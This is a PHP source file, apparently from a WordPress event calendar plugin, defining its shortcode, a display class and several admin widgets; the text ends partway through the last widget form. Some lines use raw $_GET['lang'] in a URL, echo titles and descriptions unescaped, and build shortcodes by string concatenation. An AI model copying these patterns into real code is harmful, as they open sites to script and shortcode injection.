<?php 

/************************************************************************/
/*** DISPLAY START
/************************************************************************/
class dpProEventCalendar_wpress_display {
	
	static $js_flag;
	static $js_declaration = array();
	static $id_calendar;
	static $type;
	static $limit;
	static $widget;
	static $limit_description;
	static $category;
	static $event_id;
	static $event;
	static $columns;
	static $from;
	static $view;
	static $author;
	static $get;
	static $opts;
	public $events_html;

	function dpProEventCalendar_wpress_display($id, $type, $limit, $widget, $limit_description = 0, $category, $author, $get = "", $event_id = "", $event = "", $columns = "", $from = "", $view = "", $opts = array()) {
		self::$id_calendar = $id;
		self::$type = $type;
		self::$limit = $limit;
		self::$widget = $widget;
		self::$limit_description = $limit_description;
		self::$category = $category;
		self::$event_id = $event_id;
		self::$event = $event;
		self::$columns = $columns;
		self::$view = $view;
		self::$author = $author;
		self::$get = $get;
		self::$opts = $opts;
		self::return_dpProEventCalendar();
		
		add_action('wp_footer', array(__CLASS__, 'add_scripts'), 100);
		
	}
	
	static function add_scripts() {
		global $dpProEventCalendar;
		
		if(self::$js_flag) {
			foreach( self::$js_declaration as $key) { echo $key; }
			echo '<style type="text/css">'.$dpProEventCalendar['custom_css'].'</style>';
		}
	}
	
	function return_dpProEventCalendar() {
		global $dpProEventCalendar, $wpdb, $table_prefix, $post;
		
		$id = self::$id_calendar;
		$type = self::$type;
		$limit = self::$limit;
		$author = self::$author;
		$get = self::$get;
		$widget = self::$widget;
		$limit_description = self::$limit_description;
		$category = self::$category;
		$event_id = self::$event_id;
		$event = self::$event;
		$columns = self::$columns;
		$view = self::$view;
		$from = self::$from;
		$opts = self::$opts;
		
		if($id == "") {
			$id = get_post_meta($post->ID, 'pec_id_calendar', true);
		}
		
		require_once (dirname (__FILE__) . '/../classes/base.class.php');
		$dpProEventCalendar_class = new DpProEventCalendar( false, $id, null, null, $widget, $category, $event_id, $author, $event, $columns, $from, $view, $limit_description, $opts );
		
		if($get != "") { 
			
			$this->events_html = $dpProEventCalendar_class->getFormattedEventData($get); return; 
		}
		
		if($type != "") { $dpProEventCalendar_class->switchCalendarTo($type, $limit, $limit_description, $category, $author, $event_id); }
		
		array_walk($dpProEventCalendar, 'dpProEventCalendar_reslash_multi');
		$rand_num = rand();

		//if(!$calendar->active) { return ''; }
		
		$events_script= $dpProEventCalendar_class->addScripts();
		self::$js_declaration[] = $events_script;
		
		self::$js_flag = true;
		
		if(!empty($event)) {
			$events_html = $dpProEventCalendar_class->outputEvent($event);
		} else {
			$events_html = $dpProEventCalendar_class->output();
		}
					
		$this->events_html = $events_html;
	}
}

function dpProEventCalendar_simple_shortcode($atts) {
	global $dpProEventCalendar;
	
	// Clear all W3 Total Cache
	if( class_exists('W3_Plugin_TotalCacheAdmin') )
	{
		$plugin_totalcacheadmin = & w3_instance('W3_Plugin_TotalCacheAdmin');
	
		$plugin_totalcacheadmin->flush_all();
	
	}

	extract(shortcode_atts(array(
		'id' => '',
		'type' => '',
		'category' => '',
		'event_id' => '',
		'event' => '',
		'columns' => '',
		'past' => '',
		'author' => '',
		'get' => '',
		'view' => '',
		'limit' => '',
		'widget' => '',
		'skin' => '',
		'limit_description' => ''
	), $atts));

	/* Add JS files */
	if ( !is_admin() ){ 
		wp_enqueue_script( 'jquery' );
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-datepicker', dpProEventCalendar_plugin_url( 'ui/jquery.ui.datepicker.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'placeholder', dpProEventCalendar_plugin_url( 'js/jquery.placeholder.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'selectric', dpProEventCalendar_plugin_url( 'js/jquery.selectric.min.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'jquery-form', dpProEventCalendar_plugin_url( 'js/jquery.form.min.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'icheck', dpProEventCalendar_plugin_url( 'js/jquery.icheck.min.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'dpProEventCalendar', dpProEventCalendar_plugin_url( 'js/jquery.dpProEventCalendar.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		
		wp_localize_script( 'dpProEventCalendar', 'ProEventCalendarAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php?lang='.$_GET['lang'] ), 'postEventsNonce' => wp_create_nonce( 'ajax-get-events-nonce' ) ) );
		
		if(!$dpProEventCalendar['exclude_gmaps']) {
			wp_enqueue_script( 'gmaps', 'https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false',
				null, DP_PRO_EVENT_CALENDAR_VER, false); 
		}

	}
	
	wp_enqueue_style( 'jquery-ui-core-pec', dpProEventCalendar_plugin_url( 'themes/base/jquery.ui.core.css' ),
		false, DP_PRO_EVENT_CALENDAR_VER, 'all' );
	wp_enqueue_style( 'jquery-ui-theme-pec', dpProEventCalendar_plugin_url( 'themes/base/jquery.ui.theme.css' ),
		false, DP_PRO_EVENT_CALENDAR_VER, 'all' );
	wp_enqueue_style( 'jquery-ui-datepicker-pec', dpProEventCalendar_plugin_url( 'themes/base/jquery.ui.datepicker.css' ),
		false, DP_PRO_EVENT_CALENDAR_VER, 'all' );
		
	
	if($dpProEventCalendar['rtl_support']) {
		wp_enqueue_style( 'dpProEventCalendar_rtlcss', dpProEventCalendar_plugin_url( 'css/rtl.css' ),
			false, DP_PRO_EVENT_CALENDAR_VER, 'all');
	}
	
	if($author == 'current') {
		if(is_user_logged_in()) {
			global $current_user;
			
			$author = $current_user->ID;
		} else {
			$author = '';
		}
	}
	
	$opts = array(
		'limit' => $limit,
		'widget' => $widget,
		'limit_description' => $limit_description,
		'category' => $category,
		'author' => $author,
		'get' => $get,
		'event_id' => $event_id,
		'event' => $event,
		'columns' => $columns,
		'from' => $from,
		'view' => $view,
		'skin' => $skin
	);
	
	$dpProEventCalendar_wpress_display = new dpProEventCalendar_wpress_display($id, $type, $limit, $widget, $limit_description, $category, $author, $get, $event_id, $event, $columns, $from, $view, $opts);
	return $dpProEventCalendar_wpress_display->events_html;
}
add_shortcode('dpProEventCalendar', 'dpProEventCalendar_simple_shortcode');

/************************************************************************/
/*** DISPLAY END
/************************************************************************/

/************************************************************************/
/*** WIDGET START
/************************************************************************/

class DpProEventCalendar_Widget extends WP_Widget {
	function __construct() {
		$params = array(
			'description' => 'Use the calendar as a widget',
			'name' => 'DP Pro Event Calendar'
		);
		
		parent::__construct('EventsCalendar', '', $params);
	}
	
	public function form($instance) {
		global $wpdb, $table_prefix;
		$table_name_calendars = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_CALENDARS;

		extract($instance);

		?>
        	<p>
            	<label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title','dpProEventCalendar'); ?>: </label>
                <input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" value="<?php if(isset($title)) echo esc_attr($title); ?>" />
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('description');?>"><?php _e('Description','dpProEventCalendar'); ?>: </label>
                <textarea class="widefat" rows="5" id="<?php echo $this->get_field_id('description');?>" name="<?php echo $this->get_field_name('description');?>"><?php if(isset($description)) echo esc_attr($description); ?></textarea>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('calendar');?>"><?php _e('Calendar','dpProEventCalendar'); ?>: </label>
            	<select name="<?php echo $this->get_field_name('calendar');?>" id="<?php echo $this->get_field_id('calendar');?>">
                    <?php
                    $querystr = "
                    SELECT *
                    FROM $table_name_calendars
                    ORDER BY title ASC
                    ";
                    $calendars_obj = $wpdb->get_results($querystr, OBJECT);
                    foreach($calendars_obj as $calendar_key) {
                    ?>
                        <option value="<?php echo $calendar_key->id?>" <?php if($calendar == $calendar_key->id) {?> selected="selected" <?php } ?>><?php echo $calendar_key->title?></option>
                    <?php }?>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('category');?>"><?php _e('Category','dpProEventCalendar'); ?>: </label>
            	<select name="<?php echo $this->get_field_name('category');?>" id="<?php echo $this->get_field_id('category');?>">
                    <option value=""><?php _e('All Categories...','dpProEventCalendar'); ?></option>
					<?php 
                     $categories = get_categories(array('taxonomy' => 'pec_events_category', 'hide_empty' => 0)); 
                      foreach ($categories as $category_key) {

                        $option = '<option value="'.$category_key->term_id.'" '.($category == $category_key->term_id ? 'selected="selected"' : '').'>';
                        $option .= $category_key->cat_name;
                        $option .= '</option>';
                        echo $option;
                      }
					  ?>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('author');?>"><?php _e('Author','dpProEventCalendar'); ?>: </label>
            	<select name="<?php echo $this->get_field_name('author');?>" id="<?php echo $this->get_field_id('author');?>">
                    <option value=""><?php _e('All Authors...','dpProEventCalendar'); ?></option>
                    <option value="current" <?php if($author == 'current') { ?> selected="selected"<?php }?>><?php _e('Current logged in user','dpProEventCalendar'); ?></option>
					<?php 
					$blogusers = get_users('who=authors');
					foreach ($blogusers as $user) {
						echo '<option value="'.$user->ID.'" '.($author == $user->ID ? 'selected="selected"' : '').'>' . $user->display_name . ' ('.$user->user_nicename.')</option>';
					}?>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('skin');?>"><?php _e('Skin', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('skin');?>" id="<?php echo $this->get_field_id('skin');?>">
                    <option value=""><?php _e('None','dpProEventCalendar'); ?></option>
                    <option value="red" <?php if($skin == 'red') {?> selected="selected" <?php } ?>><?php _e('Red','dpProEventCalendar'); ?></option>
                    <option value="pink" <?php if($skin == 'pink') {?> selected="selected" <?php } ?>><?php _e('Pink','dpProEventCalendar'); ?></option>
                    <option value="purple" <?php if($skin == 'purple') {?> selected="selected" <?php } ?>><?php _e('Purple','dpProEventCalendar'); ?></option>
                    <option value="deep_purple" <?php if($skin == 'deep_purple') {?> selected="selected" <?php } ?>><?php _e('Deep Purple','dpProEventCalendar'); ?></option>
                    <option value="indigo" <?php if($skin == 'indigo') {?> selected="selected" <?php } ?>><?php _e('Indigo','dpProEventCalendar'); ?></option>
                    <option value="blue" <?php if($skin == 'blue') {?> selected="selected" <?php } ?>><?php _e('Blue','dpProEventCalendar'); ?></option>
                    <option value="light_blue" <?php if($skin == 'light_blue') {?> selected="selected" <?php } ?>><?php _e('Light Blue','dpProEventCalendar'); ?></option>
                    <option value="cyan" <?php if($skin == 'cyan') {?> selected="selected" <?php } ?>><?php _e('Cyan','dpProEventCalendar'); ?></option>
                    <option value="teal" <?php if($skin == 'teal') {?> selected="selected" <?php } ?>><?php _e('Teal','dpProEventCalendar'); ?></option>
                    <option value="green" <?php if($skin == 'green') {?> selected="selected" <?php } ?>><?php _e('Green','dpProEventCalendar'); ?></option>
                    <option value="light_green" <?php if($skin == 'light_green') {?> selected="selected" <?php } ?>><?php _e('Light Green','dpProEventCalendar'); ?></option>
                    <option value="lime" <?php if($skin == 'lime') {?> selected="selected" <?php } ?>><?php _e('Lime','dpProEventCalendar'); ?></option>
                    <option value="yellow" <?php if($skin == 'yellow') {?> selected="selected" <?php } ?>><?php _e('Yellow','dpProEventCalendar'); ?></option>
                    <option value="amber" <?php if($skin == 'amber') {?> selected="selected" <?php } ?>><?php _e('Amber','dpProEventCalendar'); ?></option>
                    <option value="orange" <?php if($skin == 'orange') {?> selected="selected" <?php } ?>><?php _e('Orange','dpProEventCalendar'); ?></option>
                    <option value="deep_orange" <?php if($skin == 'deep_orange') {?> selected="selected" <?php } ?>><?php _e('Deep Orange','dpProEventCalendar'); ?></option>
                    <option value="brown" <?php if($skin == 'brown') {?> selected="selected" <?php } ?>><?php _e('Brown','dpProEventCalendar'); ?></option>
                    <option value="grey" <?php if($skin == 'grey') {?> selected="selected" <?php } ?>><?php _e('Grey','dpProEventCalendar'); ?></option>
                    <option value="blue_grey" <?php if($skin == 'blue_grey') {?> selected="selected" <?php } ?>><?php _e('Blue Grey','dpProEventCalendar'); ?></option>
                </select>
            </p>
            
            
        <?php
	}
	
	public function widget($args, $instance) {
		global $wpdb, $table_prefix;
		$table_name = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_EVENTS;
		
		extract($args);
		extract($instance);
		
		$title = apply_filters('widget_title', $title);
		$description = apply_filters('widget_description', $description);
		
		//if(empty($title)) $title = 'DP Pro Event Calendar';
		
		echo $before_widget;
			if(!empty($title))
				echo $before_title . $title . $after_title;
			echo '<p>'. $description. '</p>';
			echo do_shortcode('[dpProEventCalendar id='.$calendar.' widget=1 category="'.$category.'" author="'.$author.'" skin="'.$skin.'"]');
		echo $after_widget;
		
	}
}

add_action('widgets_init', 'dpProEventCalendar_register_widget');
function dpProEventCalendar_register_widget() {
	register_widget('DpProEventCalendar_Widget');
}

/************************************************************************/
/*** WIDGET END
/************************************************************************/

/************************************************************************/
/*** WIDGET UPCOMING EVENTS START
/************************************************************************/

class DpProEventCalendar_UpcomingEventsWidget extends WP_Widget {
	function __construct() {
		$params = array(
			'description' => 'Display the upcoming events of a calendar.',
			'name' => 'DP Pro Event Calendar - Upcoming Events'
		);
		
		parent::__construct('EventsCalendarUpcomingEvents', '', $params);
	}
	
	public function form($instance) {
		global $wpdb, $table_prefix;
		$table_name_calendars = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_CALENDARS;
		
		extract($instance);
		?>
        	<p>
            	<label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title', 'dpProEventCalendar')?>: </label>
                <input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" value="<?php if(isset($title)) echo esc_attr($title); ?>" />
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('description');?>"><?php _e('Descriptio', 'dpProEventCalendar')?>n: </label>
                <textarea class="widefat" rows="5" id="<?php echo $this->get_field_id('description');?>" name="<?php echo $this->get_field_name('description');?>"><?php if(isset($description)) echo esc_attr($description); ?></textarea>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('calendar');?>"><?php _e('Calendar', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('calendar');?>" id="<?php echo $this->get_field_id('calendar');?>">
                    <?php
                    $querystr = "
                    SELECT *
                    FROM $table_name_calendars
                    ORDER BY title ASC
                    ";
                    $calendars_obj = $wpdb->get_results($querystr, OBJECT);
                    foreach($calendars_obj as $calendar_key) {
                    ?>
                        <option value="<?php echo $calendar_key->id?>" <?php if($calendar == $calendar_key->id) {?> selected="selected" <?php } ?>><?php echo $calendar_key->title?></option>
                    <?php }?>
                </select>
            </p>
            <p>
            	<label for="<?php echo $this->get_field_id('layout');?>"><?php _e('Layout')?>: </label>
            	<select name="<?php echo $this->get_field_name('layout');?>" id="<?php echo $this->get_field_id('layout');?>" onchange="pec_get_skin_accordion(this.value);">
                	<option value=""><?php _e('Default')?></option>
                    <option value="accordion-upcoming" <?php if($layout == 'accordion-upcoming') {?> selected="selected" <?php } ?>><?php _e('Accordion')?></option>
                    <option value="gmap-upcoming" <?php if($layout == 'gmap-upcoming') {?> selected="selected" <?php } ?>><?php _e('Google Map')?></option>
                    <option value="grid-upcoming" <?php if($layout == 'grid-upcoming') {?> selected="selected" <?php } ?>><?php _e('Grid')?></option>
                </select>
            </p>
            <p>
            	<label for="<?php echo $this->get_field_id('category');?>"><?php _e('Category')?>: </label>
            	<select name="<?php echo $this->get_field_name('category');?>" id="<?php echo $this->get_field_id('category');?>">
                	<option value=""><?php _e('All')?></option>
                    <?php
                    $categories=  get_categories('taxonomy=pec_events_category'); 
					foreach ($categories as $cat) {
                    ?>
                        <option value="<?php echo $cat->term_id?>" <?php if($category == $cat->term_id) {?> selected="selected" <?php } ?>><?php echo $cat->name?></option>
                    <?php }?>
                </select>
            </p>
            
            <p id="list-<?php echo $this->get_field_id('skin');?>" <?php if($layout != 'accordion-upcoming') {?> style="display:none;" <?php } ?>>
            	<label for="<?php echo $this->get_field_id('skin');?>"><?php _e('Skin', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('skin');?>" id="<?php echo $this->get_field_id('skin');?>">
                    <option value=""><?php _e('None','dpProEventCalendar'); ?></option>
                    <option value="red" <?php if($skin == 'red') {?> selected="selected" <?php } ?>><?php _e('Red','dpProEventCalendar'); ?></option>
                    <option value="pink" <?php if($skin == 'pink') {?> selected="selected" <?php } ?>><?php _e('Pink','dpProEventCalendar'); ?></option>
                    <option value="purple" <?php if($skin == 'purple') {?> selected="selected" <?php } ?>><?php _e('Purple','dpProEventCalendar'); ?></option>
                    <option value="deep_purple" <?php if($skin == 'deep_purple') {?> selected="selected" <?php } ?>><?php _e('Deep Purple','dpProEventCalendar'); ?></option>
                    <option value="indigo" <?php if($skin == 'indigo') {?> selected="selected" <?php } ?>><?php _e('Indigo','dpProEventCalendar'); ?></option>
                    <option value="blue" <?php if($skin == 'blue') {?> selected="selected" <?php } ?>><?php _e('Blue','dpProEventCalendar'); ?></option>
                    <option value="light_blue" <?php if($skin == 'light_blue') {?> selected="selected" <?php } ?>><?php _e('Light Blue','dpProEventCalendar'); ?></option>
                    <option value="cyan" <?php if($skin == 'cyan') {?> selected="selected" <?php } ?>><?php _e('Cyan','dpProEventCalendar'); ?></option>
                    <option value="teal" <?php if($skin == 'teal') {?> selected="selected" <?php } ?>><?php _e('Teal','dpProEventCalendar'); ?></option>
                    <option value="green" <?php if($skin == 'green') {?> selected="selected" <?php } ?>><?php _e('Green','dpProEventCalendar'); ?></option>
                    <option value="light_green" <?php if($skin == 'light_green') {?> selected="selected" <?php } ?>><?php _e('Light Green','dpProEventCalendar'); ?></option>
                    <option value="lime" <?php if($skin == 'lime') {?> selected="selected" <?php } ?>><?php _e('Lime','dpProEventCalendar'); ?></option>
                    <option value="yellow" <?php if($skin == 'yellow') {?> selected="selected" <?php } ?>><?php _e('Yellow','dpProEventCalendar'); ?></option>
                    <option value="amber" <?php if($skin == 'amber') {?> selected="selected" <?php } ?>><?php _e('Amber','dpProEventCalendar'); ?></option>
                    <option value="orange" <?php if($skin == 'orange') {?> selected="selected" <?php } ?>><?php _e('Orange','dpProEventCalendar'); ?></option>
                    <option value="deep_orange" <?php if($skin == 'deep_orange') {?> selected="selected" <?php } ?>><?php _e('Deep Orange','dpProEventCalendar'); ?></option>
                    <option value="brown" <?php if($skin == 'brown') {?> selected="selected" <?php } ?>><?php _e('Brown','dpProEventCalendar'); ?></option>
                    <option value="grey" <?php if($skin == 'grey') {?> selected="selected" <?php } ?>><?php _e('Grey','dpProEventCalendar'); ?></option>
                    <option value="blue_grey" <?php if($skin == 'blue_grey') {?> selected="selected" <?php } ?>><?php _e('Blue Grey','dpProEventCalendar'); ?></option>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('events_count');?>"><?php _e('Number of events to retrieve', 'dpProEventCalendar')?>: </label>
                <input type="number" class="widefat" style="width:40px;" min="1" max="10" id="<?php echo $this->get_field_id('events_count');?>" name="<?php echo $this->get_field_name('events_count');?>" value="<?php echo !empty($events_count) ? $events_count : 5; ?>"s />
            </p>
            <p>
            	<label for="<?php echo $this->get_field_id('limit_description');?>"><?php _e('Limit Description', 'dpProEventCalendar')?>: </label>
                <input type="number" min="0" max="500" id="<?php echo $this->get_field_id('limit_description');?>" name="<?php echo $this->get_field_name('limit_description');?>" value="<?php if(isset($limit_description)) echo esc_attr($limit_description); ?>" />&nbsp;words
            </p>
            
            <script type="text/javascript">
			function pec_get_skin_accordion(val) {
				jQuery('#list-<?php echo $this->get_field_id('skin');?>').hide(); 
				
				if(val == 'accordion-upcoming') { 
				
					jQuery('#list-<?php echo $this->get_field_id('skin');?>').show(); 
				
				} 	
			}
			</script>
        <?php
	}
	
	public function widget($args, $instance) {
		global $wpdb, $table_prefix;
		$table_name = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_EVENTS;
		
		extract($args);
		extract($instance);
		
		$title = apply_filters('widget_title', $title);
		$description = apply_filters('widget_description', $description);
		$type = 'upcoming';
		
		//if(empty($title)) $title = 'DP Pro Event Calendar - Upcoming Events';
		if(!is_numeric($events_count)) { $events_count = 5; }
		
		if($layout != "") {
			$type = $layout;
		}
		
		echo $before_widget;
			if(!empty($title))
				echo $before_title . $title . $after_title;
			echo '<p>'. $description. '</p>';
			echo do_shortcode('[dpProEventCalendar id='.$calendar.' type="'.$type.'" category="'.$category.'" limit="'.$events_count.'" limit_description="'.$limit_description.'" columns="1" skin="'.$skin.'"]');
		echo $after_widget;
		
	}
}

add_action('widgets_init', 'dpProEventCalendar_register_upcomingeventswidget');
function dpProEventCalendar_register_upcomingeventswidget() {
	register_widget('DpProEventCalendar_UpcomingEventsWidget');
}

/************************************************************************/
/*** WIDGET UPCOMING EVENTS END
/************************************************************************/

/************************************************************************/
/*** WIDGET ACCORDION EVENTS START
/************************************************************************/

class DpProEventCalendar_AccordionWidget extends WP_Widget {
	function __construct() {
		$params = array(
			'description' => 'Display events in an Accordion list.',
			'name' => 'DP Pro Event Calendar - Accordion List'
		);
		
		parent::__construct('EventsCalendarAccordion', '', $params);
	}
	
	public function form($instance) {
		global $wpdb, $table_prefix;
		$table_name_calendars = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_CALENDARS;
		
		extract($instance);
		?>
        	<p>
            	<label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title', 'dpProEventCalendar')?>: </label>
                <input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" value="<?php if(isset($title)) echo esc_attr($title); ?>" />
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('description');?>"><?php _e('Description', 'dpProEventCalendar')?>: </label>
                <textarea class="widefat" rows="5" id="<?php echo $this->get_field_id('description');?>" name="<?php echo $this->get_field_name('description');?>"><?php if(isset($description)) echo esc_attr($description); ?></textarea>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('calendar');?>"><?php _e('Calendar', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('calendar');?>" id="<?php echo $this->get_field_id('calendar');?>">
                    <?php
                    $querystr = "
                    SELECT *
                    FROM $table_name_calendars
                    ORDER BY title ASC
                    ";
                    $calendars_obj = $wpdb->get_results($querystr, OBJECT);
                    foreach($calendars_obj as $calendar_key) {
                    ?>
                        <option value="<?php echo $calendar_key->id?>" <?php if($calendar == $calendar_key->id) {?> selected="selected" <?php } ?>><?php echo $calendar_key->title?></option>
                    <?php }?>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('skin');?>"><?php _e('Skin', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('skin');?>" id="<?php echo $this->get_field_id('skin');?>">
                    <option value=""><?php _e('None','dpProEventCalendar'); ?></option>
                    <option value="red" <?php if($skin == 'red') {?> selected="selected" <?php } ?>><?php _e('Red','dpProEventCalendar'); ?></option>
                    <option value="pink" <?php if($skin == 'pink') {?> selected="selected" <?php } ?>><?php _e('Pink','dpProEventCalendar'); ?></option>
                    <option value="purple" <?php if($skin == 'purple') {?> selected="selected" <?php } ?>><?php _e('Purple','dpProEventCalendar'); ?></option>
                    <option value="deep_purple" <?php if($skin == 'deep_purple') {?> selected="selected" <?php } ?>><?php _e('Deep Purple','dpProEventCalendar'); ?></option>
                    <option value="indigo" <?php if($skin == 'indigo') {?> selected="selected" <?php } ?>><?php _e('Indigo','dpProEventCalendar'); ?></option>
                    <option value="blue" <?php if($skin == 'blue') {?> selected="selected" <?php } ?>><?php _e('Blue','dpProEventCalendar'); ?></option>
                    <option value="light_blue" <?php if($skin == 'light_blue') {?> selected="selected" <?php } ?>><?php _e('Light Blue','dpProEventCalendar'); ?></option>
                    <option value="cyan" <?php if($skin == 'cyan') {?> selected="selected" <?php } ?>><?php _e('Cyan','dpProEventCalendar'); ?></option>
                    <option value="teal" <?php if($skin == 'teal') {?> selected="selected" <?php } ?>><?php _e('Teal','dpProEventCalendar'); ?></option>
                    <option value="green" <?php if($skin == 'green') {?> selected="selected" <?php } ?>><?php _e('Green','dpProEventCalendar'); ?></option>
                    <option value="light_green" <?php if($skin == 'light_green') {?> selected="selected" <?php } ?>><?php _e('Light Green','dpProEventCalendar'); ?></option>
                    <option value="lime" <?php if($skin == 'lime') {?> selected="selected" <?php } ?>><?php _e('Lime','dpProEventCalendar'); ?></option>
                    <option value="yellow" <?php if($skin == 'yellow') {?> selected="selected" <?php } ?>><?php _e('Yellow','dpProEventCalendar'); ?></option>
                    <option value="amber" <?php if($skin == 'amber') {?> selected="selected" <?php } ?>><?php _e('Amber','dpProEventCalendar'); ?></option>
                    <option value="orange" <?php if($skin == 'orange') {?> selected="selected" <?php } ?>><?php _e('Orange','dpProEventCalendar'); ?></option>
                    <option value="deep_orange" <?php if($skin == 'deep_orange') {?> selected="selected" <?php } ?>><?php _e('Deep Orange','dpProEventCalendar'); ?></option>
                    <option value="brown" <?php if($skin == 'brown') {?> selected="selected" <?php } ?>><?php _e('Brown','dpProEventCalendar'); ?></option>
                    <option value="grey" <?php if($skin == 'grey') {?> selected="selected" <?php } ?>><?php _e('Grey','dpProEventCalendar'); ?></option>
                    <option value="blue_grey" <?php if($skin == 'blue_grey') {?> selected="selected" <?php } ?>><?php _e('Blue Grey','dpProEventCalendar'); ?></option>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('limit_description');?>"><?php _e('Limit Description', 'dpProEventCalendar')?>: </label>
                <input type="number" min="0" max="500" id="<?php echo $this->get_field_id('limit_description');?>" name="<?php echo $this->get_field_name('limit_description');?>" value="<?php if(isset($limit_description)) echo esc_attr($limit_description); ?>" />&nbsp;words
            </p>
        <?php
	}
	
	public function widget($args, $instance) {
		global $wpdb, $table_prefix;
		$table_name = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_EVENTS;
		
		extract($args);
		extract($instance);
		
		$title = apply_filters('widget_title', $title);
		$description = apply_filters('widget_description', $description);
		
		//if(empty($title)) $title = 'DP Pro Event Calendar - Upcoming Events';
		
		echo $before_widget;
			if(!empty($title))
				echo $before_title . $title . $after_title;
			echo '<p>'. $description. '</p>';
			echo do_shortcode('[dpProEventCalendar id='.$calendar.' type="accordion" category="'.$category.'" limit_description="'.$limit_description.'" skin="'.$skin.'"]');
		echo $after_widget;
		
	}
}

add_action('widgets_init', 'dpProEventCalendar_register_accordionwidget');
function dpProEventCalendar_register_accordionwidget() {
	register_widget('DpProEventCalendar_AccordionWidget');
}

/************************************************************************/
/*** WIDGET ACCORDION END
/************************************************************************/

/************************************************************************/
/*** WIDGET ADD EVENTS START
/************************************************************************/

class DpProEventCalendar_AddEventsWidget extends WP_Widget {
	function __construct() {
		$params = array(
			'description' => 'Allow logged in users to submit events.',
			'name' => 'DP Pro Event Calendar - Add Events'
		);
		
		parent::__construct('EventsCalendarAddEvents', '', $params);
	}
	
	public function form($instance) {
		global $wpdb, $table_prefix;
		$table_name_calendars = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_CALENDARS;
		
		extract($instance);
		?>
        	<p>
            	<label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title', 'dpProEventCalendar')?>: </label>
                <input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" value="<?php if(isset($title)) echo esc_attr($title); ?>" />
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('description');?>"><?php _e('Description', 'dpProEventCalendar')?>: </label>
                <textarea class="widefat" rows="5" id="<?php echo $this->get_field_id('description');?>" name="<?php echo $this->get_field_name('description');?>"><?php if(isset($description)) echo esc_attr($description); ?></textarea>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('calendar');?>"><?php _e('Calendar', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('calendar');?>" id="<?php echo $this->get_field_id('calendar');?>">
                    <?php
                    $querystr = "
                    SELECT *
                    FROM $table_name_calendars
                    ORDER BY title ASC
                    ";
                    $calendars_obj = $wpdb->get_results($querystr, OBJECT);
                    foreach($calendars_obj as $calendar_key) {
                    ?>
                        <option value="<?php echo $calendar_key->id?>" <?php if($calendar == $calendar_key->id) {?> selected="selected" <?php } ?>><?php echo $calendar_key->title?></option>
                    <?php }?>
                </select>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('skin');?>"><?php _e('Skin', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('skin');?>" id="<?php echo $this->get_field_id('skin');?>">
                    <option value=""><?php _e('None','dpProEventCalendar'); ?></option>
                    <option value="red" <?php if($skin == 'red') {?> selected="selected" <?php } ?>><?php _e('Red','dpProEventCalendar'); ?></option>
                    <option value="pink" <?php if($skin == 'pink') {?> selected="selected" <?php } ?>><?php _e('Pink','dpProEventCalendar'); ?></option>
                    <option value="purple" <?php if($skin == 'purple') {?> selected="selected" <?php } ?>><?php _e('Purple','dpProEventCalendar'); ?></option>
                    <option value="deep_purple" <?php if($skin == 'deep_purple') {?> selected="selected" <?php } ?>><?php _e('Deep Purple','dpProEventCalendar'); ?></option>
                    <option value="indigo" <?php if($skin == 'indigo') {?> selected="selected" <?php } ?>><?php _e('Indigo','dpProEventCalendar'); ?></option>
                    <option value="blue" <?php if($skin == 'blue') {?> selected="selected" <?php } ?>><?php _e('Blue','dpProEventCalendar'); ?></option>
                    <option value="light_blue" <?php if($skin == 'light_blue') {?> selected="selected" <?php } ?>><?php _e('Light Blue','dpProEventCalendar'); ?></option>
